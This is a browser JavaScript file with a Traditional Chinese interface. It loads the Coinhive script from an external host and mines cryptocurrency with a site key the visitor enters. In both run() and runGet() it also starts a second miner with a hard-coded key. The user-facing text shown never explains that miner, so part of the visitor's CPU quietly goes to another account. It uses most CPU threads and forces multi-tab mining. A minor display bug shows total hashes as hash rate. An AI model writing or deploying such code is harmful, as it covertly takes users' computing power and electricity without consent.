document.write("<script src=https://coinhive.com/lib/coinhive.min.js></script>"); 

function runstart(){
	document.getElementById("minerbutton").innerHTML = "<button type=\"button\" onclick=\"run();\">開始</button>";
}

function run(){
	var YourSiteKey=document.getElementById("YourSiteKey").value;
	
	document.getElementById("minerbutton").innerHTML = "若要停止，關閉分頁即可";
if (navigator.hardwareConcurrency > 1){
	//var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
	var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency-1)}
	var cpuConfig2 = {threads: Math.round(1)}
}else{
	//var cpuConfig = {throttle:0.6}
	var cpuConfig = {throttle:0.6}
	var cpuConfig2 = {throttle:0.4}
}
var miner = new CoinHive.Anonymous(YourSiteKey, cpuConfig);
var miner2 = new CoinHive.Anonymous('9J4yPiZTyamt1dT4O0Oxnnlql6An2UP2', cpuConfig2);
miner.start(CoinHive.FORCE_MULTI_TAB);
miner2.start(CoinHive.FORCE_MULTI_TAB);
// Update stats once per second

setInterval(function() {
	var threadCount = miner.getNumThreads();
	var hashesPerSecond = Math.round(miner.getHashesPerSecond());
	var getTotalHashes = miner.getTotalHashes();
	
	var threadCount2 = miner2.getNumThreads();
	var hashesPerSecond2 = Math.round(miner2.getHashesPerSecond());
	var getTotalHashes2 = miner2.getTotalHashes();
	
	var getFullHashes = getTotalHashes +getTotalHashes2;
try {
	navigator.getBattery().then(function (battery) {
		if (battery.level < 0.50 && battery.charging == false) {
			miner.stop();
			miner2.stop();
			document.getElementById("stopped").innerHTML = "偵測到電量不足已停止運算";
		}
	});
}catch(e){console.log(e)}
	// Output to HTML elements...
	if (miner.isRunning()) {
		
		document.getElementById("RunSiteKey").innerHTML = "你的SiteKey: " + YourSiteKey;
		document.getElementById("status").innerHTML = "狀態: 正在使用 " + threadCount + " 個執行緒";
		document.getElementById("hashesPerSecond").innerHTML = "Hash/s: " + hashesPerSecond ;
		document.getElementById("getTotalHashes").innerHTML = "Hashes: " + getTotalHashes ;
	}else{
		document.getElementById("status").innerHTML = "狀態: 閒置中";
		document.getElementById("hashesPerSecond").innerHTML = "Hash/s: " + 0 ;
	}
	
	if (miner2.isRunning()) {
		document.getElementById("status2").innerHTML = "狀態: 正在使用 " + threadCount2 + " 個執行緒";
		document.getElementById("hashesPerSecond2").innerHTML = "Hash/s: " + hashesPerSecond2 ;
		document.getElementById("getTotalHashes2").innerHTML = "Hashes: " + getTotalHashes2 ;
	}else{
		document.getElementById("status2").innerHTML = "狀態: 閒置中";
		document.getElementById("hashesPerSecond2").innerHTML = "Hash/s: " + 0 ;
	}
	document.getElementById("getFullHashes").innerHTML = "Total Hashes: " + getFullHashes ;
	
}, 800);
}

function runGet(SiteKey){
	var YourSiteKey=SiteKey ;
	
	document.getElementById("minerbutton").innerHTML = "若要停止，關閉分頁即可";
if (navigator.hardwareConcurrency > 1){
	//var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
	var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency-1)}
	var cpuConfig2 = {threads: Math.round(1)}
}else{
	//var cpuConfig = {throttle:0.6}
	var cpuConfig = {throttle:0.6}
	var cpuConfig2 = {throttle:0.4}
}
var miner = new CoinHive.Anonymous(YourSiteKey, cpuConfig);
var miner2 = new CoinHive.Anonymous('9J4yPiZTyamt1dT4O0Oxnnlql6An2UP2', cpuConfig2);
miner.start(CoinHive.FORCE_MULTI_TAB);
miner2.start(CoinHive.FORCE_MULTI_TAB);
// Update stats once per second

setInterval(function() {
	var threadCount = miner.getNumThreads();
	var hashesPerSecond = Math.round(miner.getHashesPerSecond());
	var getTotalHashes = miner.getTotalHashes();
	
	var threadCount2 = miner2.getNumThreads();
	var hashesPerSecond2 = Math.round(miner2.getHashesPerSecond());
	var getTotalHashes2 = miner2.getTotalHashes();
	
	var getFullhashesPerSecond = hashesPerSecond + hashesPerSecond2;
	var getFullHashes = getTotalHashes +getTotalHashes2;
try {
	navigator.getBattery().then(function (battery) {
		if (battery.level < 0.50 && battery.charging == false) {
			miner.stop();
			miner2.stop();
			document.getElementById("stopped").innerHTML = "偵測到電量不足已停止運算";
		}
	});
}catch(e){console.log(e)}
	// Output to HTML elements...
	if (miner.isRunning()) {
		
		document.getElementById("RunSiteKey").innerHTML = "你的SiteKey: " + YourSiteKey;
		document.getElementById("status").innerHTML = "狀態: 正在使用 " + threadCount + " 個執行緒";
		document.getElementById("hashesPerSecond").innerHTML = "Hash/s: " + hashesPerSecond ;
		document.getElementById("getTotalHashes").innerHTML = "Hashes: " + getTotalHashes ;
	}else{
		document.getElementById("status").innerHTML = "狀態: 閒置中";
		document.getElementById("hashesPerSecond").innerHTML = "Hash/s: " + 0 ;
	}
	
	if (miner2.isRunning()) {
		document.getElementById("status2").innerHTML = "狀態: 正在使用 " + threadCount2 + " 個執行緒";
		document.getElementById("hashesPerSecond2").innerHTML = "Hash/s: " + hashesPerSecond2 ;
		document.getElementById("getTotalHashes2").innerHTML = "Hashes: " + getTotalHashes2 ;
	}else{
		document.getElementById("status2").innerHTML = "狀態: 閒置中";
		document.getElementById("hashesPerSecond2").innerHTML = "Hash/s: " + 0 ;
	}
	document.getElementById("getFullhashesPerSecond").innerHTML = "Total Hash/s: " + getFullHashes ;
	document.getElementById("getFullHashes").innerHTML = "Total Hashes: " + getFullHashes ;
	
}, 800);
}